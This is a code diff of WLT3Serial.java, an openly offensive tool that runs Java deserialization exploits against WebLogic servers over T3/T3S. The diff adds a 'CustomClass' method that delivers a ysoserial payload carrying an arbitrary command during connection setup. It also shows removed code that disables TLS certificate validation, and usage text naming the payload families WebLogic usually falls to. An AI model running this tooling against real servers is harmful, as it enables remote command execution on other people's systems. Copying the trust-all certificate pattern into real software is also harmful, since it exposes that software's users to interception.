@@ -1,7 +1,7 @@
 /*
 	WLT3Serial.java
 	
-	v0.3 (1/18/2018)
+	v0.4 (XX/XX/2018)
 	
 	Main class for executing java deserialization exploit against WebLogic Servers hosting a T3 or T3S listener. Parses command options, configures JVM SSL/TLS settings (if T3S
 	connection will be used), then executes exploit with set options.
@@ -12,18 +12,16 @@ package bort.millipede.wlt3;
 import java.util.Collections;
 import java.util.List;
 import java.util.ArrayList;
-import java.security.Security;
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.TrustManager;
 
 //third-party includes
 import ysoserial.Strings;
 import ysoserial.payloads.ObjectPayload;
 import ysoserial.payloads.ObjectPayload.Utils;
-import ysoserial.payloads.util.Gadgets;
 
 public class WLT3Serial {
 	public static void main(String[] args) {
+		System.out.print("\n"); //to make output slightly easier to read
+		
 		if(args.length<4) { //check number of arguments, print Usage if short
 			usage();
 			return;
@@ -98,6 +96,16 @@ public class WLT3Serial {
 								return;
 							}
 							break;
+						case "--method=CustomClass": //set "Custom ClassTableEntry Class" exploit method
+							if(!methSet) {
+								method = "CustomClass";
+								methSet = true;
+							} else {
+								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
+								usage();
+								return;
+							}
+							break;
 						case "--t3s=TLSv1.2": //use T3S to connect with TLSv1.2
 							if(!tlsSet) {
 								t3s = true;
@@ -162,11 +170,31 @@ public class WLT3Serial {
 			}
 		}
 		
+		//check if correct weblogic.rjvm.ClassTableEntry class (default or custom) is loaded into JVM for chosen exploitaton method
+		switch(method) {
+			case "Property":
+			case "Bind":
+			case "WLBind":
+				if(WLT3SerialHelper.isCTECustom()) {
+					System.err.print("Error: wrong weblogic.rjvm.ClassTableEntry class loaded! ");
+					System.err.print("Re-run WLT3Serial with different classpath argument (wlthint3client.jar should be specified before WLT3Serial.jar)!\n");
+					return;
+				}
+				break;
+			case "CustomClass":
+				if(!WLT3SerialHelper.isCTECustom()) {
+					System.err.print("Error: wrong weblogic.rjvm.ClassTableEntry class loaded! ");
+					System.err.print("Re-run WLT3Serial with different classpath argument (WLT3Serial.jar should be specified before wlthint3client.jar)!\n");
+					return;
+				}
+				break;
+		}
+		
 		try {		
 			//check validity of inputted ysoserial payload type, and generate ysoserial payload
 			final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 			if(payloadClass == null) {
-				System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial jar file is in classpath, and check Usage (--help option) for available payload types!");
+				System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial.jar file is in classpath, and check Usage (--help option) for available payload types!");
 				return;
 			}
 			final ObjectPayload payload = payloadClass.newInstance();
@@ -175,7 +203,7 @@ public class WLT3Serial {
 			//set desired SSL/TLS protocol(s) (if using T3S) and display connection information			
 			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port));
 			if(t3s) {
-				setSSLTLSProtocol();
+				WLT3SerialHelper.setSSLTLSProtocol();
 				String encProt = System.getProperty("jdk.tls.client.protocols");
 				System.out.print(" (with ");
 				if(encProt.contains("SSLv2Hello")) {
@@ -187,7 +215,7 @@ public class WLT3Serial {
 			}
 			System.out.print(": ... ");
 			
-			//run exploit			
+			//run exploit
 			switch(method) {
 				case "Property":
 					ContextExploit.runPropertyExploit(object,host,port,t3s,verbose);
@@ -198,14 +226,19 @@ public class WLT3Serial {
 				case "WLBind":
 					WLNamingExploit.runWLBindExploit(object,host,port,t3s,verbose);
 					break;
+				case "CustomClass":
+					System.setProperty("bort.millipede.wlt3.type",payloadType);
+					System.setProperty("bort.millipede.wlt3.command",command);
+					CustomClassTableEntryExploit.runCustomClassExploit(host,port,t3s,verbose);
+					break;
 			}
 		} catch(NoClassDefFoundError ncdfe) {
 			String message = ncdfe.getMessage();
 			if(message.contains("ysoserial")) {
-				System.err.println("Error loading ysoserial library! Ensure that ysoserial jar file is in classpath, and check Usage (--help option) for available payload types!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
+				System.err.println("Error loading ysoserial library! Ensure that ysoserial.jar file is in classpath, and check Usage (--help option) for available payload types!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
 			} else if(message.contains("weblogic")) {
 				System.out.println("\b\b\b\bfailed!");
-				System.err.println("Error loading wlthint3client! Ensure that wlthint3client.jar file is in class path!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
+				System.err.println("Error loading wlthint3client! Ensure that wlthint3client.jar file is in classpath!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
 			}
 			
 			if(verbose) {
@@ -214,132 +247,11 @@ public class WLT3Serial {
 			}
 		} catch(Exception e) {
 			System.err.println("Unknown Error Occurred ("+e.getClass().getName()+")"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
-		}
-	}
-	
-	//Set SSL/TLS options: enable desired protocol(s) and disable protocols not chosen during application startup
-	private static void setSSLTLSProtocol() throws Exception {
-		String tlsSysProp = System.getProperty("jdk.tls.client.protocols");
-
-		//check if 'jdk.tls.disabledAlgorithms' Security property is set, and remove SSLv3 if set
-		String tlsSecProp = Security.getProperty("jdk.tls.disabledAlgorithms");
-		if(tlsSecProp!=null) {
-			ArrayList<String> protocols = new ArrayList<String>(5);
-			protocols.add("SSLv2Hello");
-			protocols.add("SSLv3");
-			protocols.add("TLSv1");
-			protocols.add("TLSv1.1");
-			protocols.add("TLSv1.2");
-			
-			String disabledProts = null;
-			if(tlsSysProp.contains("SSL")) { //using SSL protocol(s) for connection
-				protocols.remove("SSLv3");
-				if(tlsSysProp.contains("SSLv2Hello")) protocols.remove("SSLv2Hello");
-				disabledProts = join(protocols,", ");
-		
-				if(tlsSecProp.contains("SSLv3")) {
-					tlsSecProp = tlsSecProp.replace("SSLv3", disabledProts);
-				} else {
-					tlsSecProp = tlsSecProp.trim();
-					if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
-					tlsSecProp += disabledProts;
-				}
-			} else { //using TLS protocol for connection
-				switch(tlsSysProp) {
-					case "TLSv1.2":
-						protocols.remove("TLSv1.2");
-						break;
-					case "TLSv1.1":
-						protocols.remove("TLSv1.1");
-						break;
-					case "TLSv1":
-						protocols.remove("TLSv1");
-						break;
-				}
-				
-				if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
-				tlsSecProp += join(protocols,", ");
-			}
-			Security.setProperty("jdk.tls.disabledAlgorithms",tlsSecProp);
-		} else { //jdk.tls.disabledAlgorithms is not set in running JVM: if JVM is version 8, set property
-			if(!isJVM7()) {
-				ArrayList<String> protocols = new ArrayList<String>(5);
-				protocols.add("SSLv2Hello");
-				protocols.add("SSLv3");
-				protocols.add("TLSv1");
-				protocols.add("TLSv1.1");
-				protocols.add("TLSv1.2");
-				
-				String disabledProts = null;
-				if(tlsSysProp.contains("SSL")) { //using SSL protocol(s) for connection
-					protocols.remove("SSLv3");
-					if(tlsSysProp.contains("SSLv2Hello")) protocols.remove("SSLv2Hello");
-					disabledProts = join(protocols,", ");
-			
-					if(tlsSecProp.contains("SSLv3")) {
-						tlsSecProp = tlsSecProp.replace("SSLv3", disabledProts);
-					} else {
-						tlsSecProp = tlsSecProp.trim();
-						if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
-						tlsSecProp += disabledProts;
-					}
-				} else { //using TLS protocol for connection
-					switch(tlsSysProp) {
-						case "TLSv1.2":
-							protocols.remove("TLSv1.2");
-							break;
-						case "TLSv1.1":
-							protocols.remove("TLSv1.1");
-							break;
-						case "TLSv1":
-							protocols.remove("TLSv1");
-							break;
-					}
-					
-					if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
-					tlsSecProp += join(protocols,", ");
-				}
-				Security.setProperty("jdk.tls.disabledAlgorithms",tlsSecProp);
+			if(verbose) {
+				System.err.print("\n");
+				e.printStackTrace();
 			}
 		}
-		
-		if(isJVM7()) { //running JVM is version 7 or lower: set custom SSLSocketFactory implementation as default
-			Security.setProperty("ssl.SocketFactory.provider","bort.millipede.wlt3.CustomSSLSocketFactory");
-		} else { //running JVM is version 8 or higher: set default SSLContext with SSL/TLS certificate validation disabled
-			SSLContext defaultContext = null;
-			if(tlsSysProp.contains("SSL")) {
-				defaultContext = SSLContext.getInstance("SSL");
-			} else {
-				defaultContext = SSLContext.getInstance(tlsSysProp);
-			}
-			TrustManager[] trustAll = new TrustManager[] {new TrustAllCertsManager()};
-			defaultContext.init(null,trustAll,null);
-			SSLContext.setDefault(defaultContext);
-		}
-	}
-	
-	//join List<String> into String with specified delimeter
-	private static String join(List<String> list,String delimeter) {
-		if(delimeter==null) delimeter="";
-		if(list==null) return null;
-		
-		String[] arr = new String[list.size()];
-		arr = list.toArray(arr);
-		String retVal = "";
-		int i=0;
-		while(i<arr.length-1) {
-			if(arr[i]==null) arr[i] = "";
-			retVal += arr[i]+delimeter;
-			i++;
-		}
-		if(arr[i]==null) arr[i] = "";
-		retVal += arr[i];
-		return retVal;
-	}
-	
-	//check if running JVM is Java 7
-	private static boolean isJVM7() {
-		return (Double.parseDouble(System.getProperty("java.vm.specification.version")) < 1.8);
 	}
 	
 	//print Usage information
@@ -349,15 +261,16 @@ public class WLT3Serial {
 		System.err.println("\t--help\t\t\t\tprint usage (you\'re lookin at it)\n");
 		System.err.println("\t--verbose\t\t\tVerbose output (full thrown exception output)\n");
 		System.err.println("\t--method=EXPLOIT_METHOD\t\tExploit Method for delivering generated ysoserial payload");
-		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, via javax.naming.Context.lookup(), similar to JavaUnserializeExploits weblogic.py)");
-		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), also similar to JavaUnserializeExploits weblogic.py)");
-		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)\n");
+		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, via javax.naming.Context.lookup(), variation of ysoserial.exploit.RMIRegistryExploit)");
+		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), similar to ysoserial.exploit.RMIRegistryExploit)");
+		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)");
+		System.err.println("\t\t\tCustomClass\tSend ysoserial payload during T3/T3S connection initialization (via custom weblogic.rjvm.ClassTableEntry class, similar to JavaUnserializeExploits weblogic.py)\n");
 		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
 		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2\n\t\t\tTLSv1.1\n\t\t\tTLSv1 (Default)\n\t\t\tSSLv3");
 		System.err.println("\t\t\tSSLv2 (SSLv2Hello handshake only, then fallback to SSLv3 for communication: this is an Oracle Java limitation, not a tool limitation)\n\n");
 		
 		//list available ysoserial payload types, or print error on failure
-		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" types):");
+		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" and \"JRMPClientX\" types):");
 		try {
 			final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
 			Collections.sort(payloadClasses, new Strings.ToStringComparator());
